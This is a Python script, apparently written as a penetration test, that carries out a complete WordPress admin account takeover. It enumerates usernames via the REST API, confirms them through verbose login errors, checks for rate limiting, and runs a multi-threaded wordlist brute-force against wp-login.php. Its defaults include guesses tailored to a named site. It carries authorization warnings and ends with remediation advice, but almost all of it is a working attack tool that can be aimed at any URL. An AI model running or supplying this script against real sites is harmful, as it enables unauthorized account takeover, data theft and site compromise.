#!/usr/bin/env python3
"""
Attack Chain 1: Admin Account Takeover — Brute-Force Test Script

This script demonstrates the full Attack Chain 1 against a WordPress site.
It replicates what an attacker would do against a WordPress site with the
same vulnerabilities found on www.starregistry.com:

  1. Enumerate usernames via REST API
  2. Confirm valid usernames via login error messages
  3. Brute-force passwords using a dictionary (multi-threaded)

IMPORTANT: Only run this against YOUR OWN test environment or sites you own.

Usage:
    python3 bruteforce_test.py --url http://localhost:8080
    python3 bruteforce_test.py --url https://example.com --threads 50
    python3 bruteforce_test.py --url https://example.com --wordlist rockyou.txt --threads 100
    python3 bruteforce_test.py --url https://example.com --wordlist rockyou.txt --max-passwords 200000
"""

import argparse
import sys
import time
import threading
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Default password list (common weak passwords — for testing purposes)
DEFAULT_PASSWORDS = [
    "password", "123456", "admin", "admin123", "password123",
    "wordpress", "letmein", "welcome", "monkey", "dragon",
    "master", "login", "abc123", "qwerty", "trustno1",
    "iloveyou", "starregistry", "star123", "admin2026",
    "P@ssw0rd", "changeme", "test", "test123", "root",
    "toor", "pass", "1234", "12345", "123456789",
    "password1", "1password", "administrator", "admin1",
    "manager", "supervisor", "welcome1", "hello123",
    "sunshine", "princess", "football", "shadow",
    "michael", "jennifer", "hunter2", "batman",
    "access", "mustang", "121212", "696969",
    "passw0rd", "starAdmin", "Star123!", "registry",
]


def banner():
    print(f"""
{BOLD}{RED}╔══════════════════════════════════════════════════════════════╗
║         ATTACK CHAIN 1: ADMIN ACCOUNT TAKEOVER TEST        ║
║                                                            ║
║  Demonstrates brute-force vulnerability against WordPress  ║
║  with misconfigured login security (no rate limiting,      ║
║  verbose errors, exposed usernames via REST API)           ║
║                                                            ║
║  ⚠  FOR AUTHORIZED TESTING ONLY                            ║
╚══════════════════════════════════════════════════════════════╝{RESET}
""")


def phase1_enumerate_users(base_url):
    """Phase 1: Enumerate usernames via WP REST API"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 1: USERNAME ENUMERATION VIA REST API ═══{RESET}\n")

    users_url = urljoin(base_url, "/wp-json/wp/v2/users")
    print(f"  Target: {users_url}")

    try:
        resp = requests.get(users_url, timeout=10)
        if resp.status_code == 200:
            users = resp.json()
            if isinstance(users, list) and len(users) > 0:
                print(f"\n  {GREEN}[SUCCESS]{RESET} Found {len(users)} user(s):\n")
                usernames = []
                for u in users:
                    uid = u.get("id", "?")
                    name = u.get("name", "?")
                    slug = u.get("slug", "?")
                    role_hint = "LIKELY ADMIN" if uid == 1 else "Staff"
                    color = RED if uid == 1 else YELLOW
                    print(f"    {color}ID: {uid:<5} Username: {slug:<20} Name: {name:<25} [{role_hint}]{RESET}")
                    usernames.append(slug)
                return usernames
            else:
                print(f"  {YELLOW}[INFO]{RESET} API returned empty or non-list response")
                return []
        elif resp.status_code == 401 or resp.status_code == 403:
            print(f"  {GREEN}[SECURED]{RESET} REST API user enumeration is BLOCKED (HTTP {resp.status_code})")
            print(f"  This site is protected against Phase 1 of Attack Chain 1.")
            return []
        else:
            print(f"  {YELLOW}[INFO]{RESET} Unexpected response: HTTP {resp.status_code}")
            return []
    except requests.RequestException as e:
        print(f"  {RED}[ERROR]{RESET} Could not connect: {e}")
        return []


def phase2_confirm_username(base_url, username):
    """Phase 2: Confirm username validity via login error messages"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 2: USERNAME CONFIRMATION VIA LOGIN ERRORS ═══{RESET}\n")

    login_url = urljoin(base_url, "/wp-login.php")
    print(f"  Target: {login_url}")
    print(f"  Testing username: {username}\n")

    try:
        # First GET the login page to collect cookies (WordPress requires testcookie)
        session = requests.Session()
        session.get(login_url, timeout=10)

        # Test with the target username
        resp = session.post(login_url, data={
            "log": username,
            "pwd": "definitely_wrong_password_12345",
            "wp-submit": "Log In",
            "redirect_to": urljoin(base_url, "/wp-admin/"),
            "testcookie": "1"
        }, allow_redirects=True, timeout=10)

        body = resp.text

        if "incorrect" in body.lower() and username.lower() in body.lower():
            print(f"  {RED}[VULNERABLE]{RESET} Server confirms username EXISTS:")
            print(f'  Error: "The password you entered for the username {username} is incorrect."')
            print(f"\n  {YELLOW}This means an attacker knows this is a VALID account to brute-force.{RESET}")
            return True
        elif "not registered" in body.lower() or "invalid username" in body.lower():
            print(f"  {GREEN}[SAFE]{RESET} Server says username does NOT exist.")
            return False
        elif "invalid username or password" in body.lower():
            print(f"  {GREEN}[SECURED]{RESET} Server uses GENERIC error message.")
            print(f"  Attacker cannot determine if username is valid.")
            return False
        elif "cookies" in body.lower() and "blocked" in body.lower():
            print(f"  {YELLOW}[RETRY]{RESET} Cookie issue, retrying with fresh session...")
            session2 = requests.Session()
            session2.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
            resp2 = session2.post(login_url, data={
                "log": username,
                "pwd": "definitely_wrong_password_12345",
                "wp-submit": "Log In",
                "redirect_to": urljoin(base_url, "/wp-admin/"),
                "testcookie": "1"
            }, allow_redirects=True, timeout=10)
            body2 = resp2.text
            if "incorrect" in body2.lower() and username.lower() in body2.lower():
                print(f"  {RED}[VULNERABLE]{RESET} Server confirms username EXISTS:")
                print(f'  Error: "The password you entered for the username {username} is incorrect."')
                print(f"\n  {YELLOW}This means an attacker knows this is a VALID account to brute-force.{RESET}")
                return True
            elif "not registered" in body2.lower() or "invalid username" in body2.lower():
                print(f"  {GREEN}[SAFE]{RESET} Server says username does NOT exist.")
                return False
            else:
                print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern after retry.")
                return True
        else:
            print(f"  {YELLOW}[UNKNOWN]{RESET} Could not determine error message pattern.")
            print(f"  Response snippet: {body[body.find('login_error'):body.find('login_error')+200] if 'login_error' in body else 'N/A'}")
            return True

    except requests.RequestException as e:
        print(f"  {RED}[ERROR]{RESET} Could not connect: {e}")
        return False


def phase3_check_rate_limiting(base_url, username):
    """Phase 2.5: Check if rate limiting exists"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 2.5: RATE LIMITING CHECK ═══{RESET}\n")

    login_url = urljoin(base_url, "/wp-login.php")
    print(f"  Sending 10 rapid login attempts...")

    blocked = False
    times = []

    for i in range(1, 11):
        start = time.time()
        try:
            resp = requests.post(login_url, data={
                "log": username,
                "pwd": f"wrong_password_{i}",
                "wp-submit": "Log In",
            }, allow_redirects=True, timeout=10)
            elapsed = (time.time() - start) * 1000
            times.append(elapsed)

            if resp.status_code == 429:
                print(f"  Attempt {i:>2}: {GREEN}HTTP 429 — RATE LIMITED{RESET} ({elapsed:.0f}ms)")
                blocked = True
                break
            elif resp.status_code == 403:
                print(f"  Attempt {i:>2}: {GREEN}HTTP 403 — BLOCKED{RESET} ({elapsed:.0f}ms)")
                blocked = True
                break
            elif "too many" in resp.text.lower() or "locked" in resp.text.lower():
                print(f"  Attempt {i:>2}: {GREEN}HTTP {resp.status_code} — LOCKOUT DETECTED{RESET} ({elapsed:.0f}ms)")
                blocked = True
                break
            else:
                print(f"  Attempt {i:>2}: HTTP {resp.status_code} ({elapsed:.0f}ms)")
        except requests.RequestException as e:
            print(f"  Attempt {i:>2}: {RED}ERROR — {e}{RESET}")
            blocked = True
            break

    if blocked:
        print(f"\n  {GREEN}[SECURED]{RESET} Rate limiting or lockout detected.")
        print(f"  Brute-force attack would be slowed or blocked.")
        return False
    else:
        avg_time = sum(times) / len(times)
        print(f"\n  {RED}[VULNERABLE]{RESET} No rate limiting detected!")
        print(f"  Average response time: {avg_time:.0f}ms")
        print(f"  At this rate: ~{int(3600000/avg_time):,} attempts/hour possible (single thread)")
        return True


def phase3_bruteforce(base_url, username, passwords, num_threads=1):
    """Phase 3: Multi-threaded dictionary brute-force attack"""
    print(f"\n{BOLD}{CYAN}═══ PHASE 3: PASSWORD BRUTE-FORCE ═══{RESET}\n")

    login_url = urljoin(base_url, "/wp-login.php")
    total = len(passwords)
    print(f"  Target:    {login_url}")
    print(f"  Username:  {username}")
    print(f"  Wordlist:  {total:,} passwords")
    print(f"  Threads:   {num_threads}")
    print(f"  Method:    POST to wp-login.php")

    if num_threads > 1:
        est_per_sec = num_threads * 0.9  # ~90% efficiency
        est_hours = total / est_per_sec / 3600
        if est_hours > 1:
            print(f"  Estimate:  ~{est_hours:.1f} hours ({est_per_sec:.0f} attempts/sec)")
        else:
            est_min = total / est_per_sec / 60
            print(f"  Estimate:  ~{est_min:.0f} minutes ({est_per_sec:.0f} attempts/sec)")
    print()

    # Shared state for threads
    found_password = [None]  # use list for mutability in threads
    found_attempt = [0]
    attempt_count = [0]
    error_count = [0]
    blocked = [False]
    lock = threading.Lock()
    start_time = time.time()

    def try_password(password, index):
        """Worker function — tries a single password"""
        if found_password[0] is not None or blocked[0]:
            return None

        try:
            # Each thread uses its own session
            sess = requests.Session()
            sess.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
            resp = sess.post(login_url, data={
                "log": username,
                "pwd": password,
                "wp-submit": "Log In",
                "redirect_to": urljoin(base_url, "/wp-admin/"),
                "testcookie": "1"
            }, allow_redirects=False, timeout=15)

            with lock:
                attempt_count[0] += 1
                current = attempt_count[0]

            # WordPress redirects to wp-admin on successful login (302)
            if resp.status_code == 302:
                location = resp.headers.get("Location", "")
                if "wp-admin" in location:
                    found_password[0] = password
                    found_attempt[0] = current
                    return password

            # Rate limited or blocked
            elif resp.status_code == 429 or resp.status_code == 403:
                blocked[0] = True
                with lock:
                    print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting kicked in at attempt {current}")
                    print(f"  The brute-force attack was stopped by security controls.")
                return None

        except requests.RequestException:
            with lock:
                error_count[0] += 1
                attempt_count[0] += 1
            # Don't stop on individual request errors — just skip
            return None

        return None

    # Progress reporter thread
    def progress_reporter():
        while found_password[0] is None and not blocked[0]:
            time.sleep(1)
            elapsed = time.time() - start_time
            current = attempt_count[0]
            errors = error_count[0]
            if elapsed > 0:
                rate = current / elapsed
                remaining = (total - current) / rate if rate > 0 else 0
                hours = int(remaining // 3600)
                mins = int((remaining % 3600) // 60)
                err_str = f" | {RED}errors: {errors}{RESET}" if errors > 0 else ""
                print(f"\r  [{current:>8,}/{total:,}] {rate:.1f} req/s | "
                      f"elapsed: {int(elapsed)}s | "
                      f"remaining: {hours}h {mins}m{err_str}     ", end="")
                sys.stdout.flush()

    # Start progress reporter
    reporter = threading.Thread(target=progress_reporter, daemon=True)
    reporter.start()

    if num_threads == 1:
        # Single-threaded mode (original behavior)
        session = requests.Session()
        session.cookies.set("wordpress_test_cookie", "WP%20Cookie%20check")
        try:
            session.get(login_url, timeout=10)
        except requests.RequestException:
            pass

        for i, password in enumerate(passwords, 1):
            if found_password[0] is not None or blocked[0]:
                break
            try:
                resp = session.post(login_url, data={
                    "log": username,
                    "pwd": password,
                    "wp-submit": "Log In",
                    "redirect_to": urljoin(base_url, "/wp-admin/"),
                    "testcookie": "1"
                }, allow_redirects=False, timeout=15)

                with lock:
                    attempt_count[0] = i

                if resp.status_code == 302:
                    location = resp.headers.get("Location", "")
                    if "wp-admin" in location:
                        found_password[0] = password
                        found_attempt[0] = i
                        break
                elif resp.status_code == 429 or resp.status_code == 403:
                    blocked[0] = True
                    print(f"\n\n  {GREEN}[BLOCKED]{RESET} HTTP {resp.status_code} — rate limiting at attempt {i}")
                    break
            except requests.RequestException as e:
                with lock:
                    error_count[0] += 1
                continue
    else:
        # Multi-threaded mode
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = {}
            for i, password in enumerate(passwords):
                if found_password[0] is not None or blocked[0]:
                    break
                future = executor.submit(try_password, password, i)
                futures[future] = password

                # Don't submit too far ahead — limit queue to 2x threads
                while len(futures) > num_threads * 2:
                    done = [f for f in futures if f.done()]
                    for f in done:
                        del futures[f]
                    if not done:
                        time.sleep(0.05)

            # Wait for remaining futures
            for future in as_completed(futures):
                pass

    elapsed = time.time() - start_time

    if found_password[0]:
        pw = found_password[0]
        att = found_attempt[0]
        print(f"\n\n  {RED}{BOLD}╔════════════════════════════════════════════════╗{RESET}")
        print(f"  {RED}{BOLD}║  PASSWORD FOUND!                               ║{RESET}")
        print(f"  {RED}{BOLD}║                                                ║{RESET}")
        print(f"  {RED}{BOLD}║  Username: {username:<34} ║{RESET}")
        print(f"  {RED}{BOLD}║  Password: {pw:<34} ║{RESET}")
        print(f"  {RED}{BOLD}║  Attempts: {att:<34,} ║{RESET}")
        time_str = f"{elapsed:.1f}s"
        print(f"  {RED}{BOLD}║  Time:     {time_str:<34} ║{RESET}")
        rate_str = f"{att/elapsed:.1f} req/s" if elapsed > 0 else "N/A"
        print(f"  {RED}{BOLD}║  Speed:    {rate_str:<34} ║{RESET}")
        print(f"  {RED}{BOLD}╚════════════════════════════════════════════════╝{RESET}")
        print(f"\n  {RED}ATTACK CHAIN 1 COMPLETE — Full admin access achieved.{RESET}")
        print(f"  An attacker could now:")
        print(f"    - Install malicious plugins (remote code execution)")
        print(f"    - Export all customer data")
        print(f"    - Inject credit card skimmers")
        print(f"    - Deface the website")
        print(f"    - Create backdoor accounts")
        return True
    elif blocked[0]:
        return False
    else:
        total_tried = attempt_count[0]
        rate = total_tried / elapsed if elapsed > 0 else 0
        print(f"\n\n  {GREEN}[NOT CRACKED]{RESET} Password not found in wordlist ({total_tried:,} attempts)")
        print(f"  Time elapsed: {elapsed:.1f}s ({rate:.1f} req/s)")
        print(f"  Errors: {error_count[0]}")
        print(f"\n  {YELLOW}NOTE: This doesn't mean the site is secure!{RESET}")
        print(f"  The VULNERABILITY still exists (no rate limiting).")
        print(f"  The password just wasn't in this wordlist.")
        return False


def print_summary(user_enum, user_confirmed, no_rate_limit, password_found):
    """Print final summary"""
    print(f"\n\n{BOLD}{'='*62}{RESET}")
    print(f"{BOLD}  ATTACK CHAIN 1 — VULNERABILITY SUMMARY{RESET}")
    print(f"{BOLD}{'='*62}{RESET}\n")

    checks = [
        ("REST API User Enumeration", user_enum,
         "Usernames exposed via /wp-json/wp/v2/users",
         "REST API user endpoint is blocked"),
        ("Login Error Username Confirmation", user_confirmed,
         "Error messages reveal valid/invalid usernames",
         "Generic error messages used"),
        ("No Rate Limiting on Login", no_rate_limit,
         "Unlimited login attempts allowed",
         "Rate limiting or lockout active"),
        ("Password Cracked via Brute-Force", password_found,
         "Admin password found in dictionary",
         "Password not in test wordlist (may still be weak)"),
    ]

    vulns = 0
    for name, is_vuln, vuln_msg, safe_msg in checks:
        if is_vuln:
            print(f"  {RED}[VULNERABLE]{RESET} {name}")
            print(f"             {vuln_msg}")
            vulns += 1
        else:
            print(f"  {GREEN}[SECURED]   {RESET} {name}")
            print(f"             {safe_msg}")
        print()

    print(f"  {BOLD}Result: {vulns}/4 vulnerabilities confirmed{RESET}")
    if vulns >= 3:
        print(f"\n  {RED}{BOLD}CRITICAL: Attack Chain 1 is viable against this configuration.{RESET}")
        print(f"  {RED}Your production site shares these same vulnerabilities.{RESET}")
    elif vulns >= 1:
        print(f"\n  {YELLOW}{BOLD}WARNING: Partial vulnerability — some attack chain steps work.{RESET}")
    else:
        print(f"\n  {GREEN}{BOLD}GOOD: Attack Chain 1 is blocked at all stages.{RESET}")

    print(f"\n{BOLD}  Recommended Fixes:{RESET}")
    print(f"  1. Disable REST API user enumeration (functions.php filter)")
    print(f"  2. Genericize login error messages (login_errors filter)")
    print(f"  3. Add rate limiting/CAPTCHA to wp-login.php")
    print(f"  4. Enable 2FA for all admin accounts")
    print(f"  5. Use strong, unique passwords (20+ chars)")
    print()


def main():
    parser = argparse.ArgumentParser(
        description="Attack Chain 1: WordPress Admin Brute-Force Test",
        epilog="Only use against YOUR OWN sites and test environments."
    )
    parser.add_argument("--url", default="http://localhost:8080",
                        help="Target WordPress URL (default: http://localhost:8080)")
    parser.add_argument("--username", default=None,
                        help="Target username (default: auto-detect via REST API)")
    parser.add_argument("--wordlist", default=None,
                        help="Path to password wordlist file (one per line)")
    parser.add_argument("--skip-bruteforce", action="store_true",
                        help="Only run phases 1-2, skip actual brute-force")
    parser.add_argument("--threads", type=int, default=50,
                        help="Number of concurrent threads (default: 50)")
    parser.add_argument("--max-passwords", type=int, default=0,
                        help="Only test first N passwords from wordlist (0 = all)")
    args = parser.parse_args()

    banner()

    base_url = args.url.rstrip("/")
    print(f"  Target: {base_url}")

    # Phase 1: Enumerate users
    usernames = phase1_enumerate_users(base_url)

    # Determine target username
    if args.username:
        target_user = args.username
    elif usernames:
        target_user = usernames[0]
        print(f"\n  {YELLOW}Auto-selected target: {target_user}{RESET}")
    else:
        print(f"\n  {YELLOW}No users found via API. Using 'admin' as default.{RESET}")
        target_user = "admin"

    # Phase 2: Confirm username
    user_confirmed = phase2_confirm_username(base_url, target_user)

    # Phase 2.5: Check rate limiting
    no_rate_limit = phase3_check_rate_limiting(base_url, target_user)

    # Phase 3: Brute-force (if requested)
    password_found = False
    if not args.skip_bruteforce:
        if args.wordlist:
            try:
                with open(args.wordlist, encoding="latin-1") as f:
                    passwords = [line.strip() for line in f if line.strip()]
                if args.max_passwords > 0:
                    passwords = passwords[:args.max_passwords]
                    print(f"\n  Loaded {len(passwords):,} passwords (limited to first {args.max_passwords:,} from {args.wordlist})")
                else:
                    print(f"\n  Loaded {len(passwords):,} passwords from {args.wordlist}")
            except FileNotFoundError:
                print(f"\n  {RED}[ERROR]{RESET} Wordlist not found: {args.wordlist}")
                passwords = DEFAULT_PASSWORDS
        else:
            passwords = DEFAULT_PASSWORDS

        password_found = phase3_bruteforce(base_url, target_user, passwords, args.threads)
    else:
        print(f"\n  {YELLOW}[SKIPPED]{RESET} Brute-force phase skipped (--skip-bruteforce)")

    # Summary
    user_enum = len(usernames) > 0
    print_summary(user_enum, user_confirmed, no_rate_limit, password_found)


if __name__ == "__main__":
    main()
